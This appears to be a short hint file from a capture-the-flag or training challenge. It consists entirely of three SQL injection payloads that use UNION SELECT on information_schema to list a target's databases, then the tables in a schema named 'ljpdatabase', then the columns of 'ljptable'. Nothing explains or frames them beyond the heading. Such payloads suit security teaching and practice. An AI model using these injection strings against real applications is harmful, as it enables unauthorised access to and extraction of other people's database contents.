# Hint
Leak databases
```
1\' UNION SELECT 1, table_schema , 1, true FROM information_schema.tables # 
```

Leak table
```
1\' UNION SELECT 1, table_name , 1, true FROM information_schema.tables WHERE table_schema = "ljpdatabase" #
```

Leak column
```
1\' UNION SELECT 1, column_name , 1, true FROM information_schema.columns WHERE table_name = "ljptable" #
```

